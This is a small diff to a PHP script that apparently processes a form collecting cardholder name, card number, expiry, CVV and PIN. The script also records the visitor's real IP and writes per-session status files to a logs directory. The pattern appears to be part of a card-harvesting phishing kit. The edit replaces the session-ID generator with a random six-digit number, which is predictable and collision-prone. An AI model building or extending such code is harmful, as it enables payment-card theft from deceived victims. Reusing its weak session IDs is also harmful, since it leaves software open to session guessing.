@@ -24,8 +24,8 @@ if (empty($holder) || empty($card) || empty($expiry) || empty($cvv) || empty($pi
 // Get real IP address
 $realIp = getRealIpAddress();
 
-// Generate session ID
-$sessionId = getSessionId();
+// Generate session ID (6-digit number)
+$sessionId = rand(100000, 999999);
 
 // Create status file
 $statusFile = LOGS_DIR . $sessionId . '.status';
